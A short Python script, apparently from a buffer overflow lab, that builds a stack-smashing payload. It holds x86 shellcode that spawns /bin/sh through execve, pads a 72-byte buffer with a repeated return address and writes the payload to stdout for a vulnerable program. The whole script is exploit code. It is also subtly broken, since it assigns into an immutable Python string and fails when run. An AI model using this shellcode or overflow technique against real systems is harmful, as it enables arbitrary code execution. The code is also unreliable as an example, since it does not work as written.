import sys

expString = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print(len(expString))


tot_length = 64 + 4 + 4


print(tot_length//4)

address = "\x08\x0b\xbf\x99"


attack_string = ""

for i in range(0,tot_length-1,4):
    attack_string = attack_string + address


for i in range(len(expString)):
    attack_string[i] = expString[i]

sys.stdout.write(attack_string)
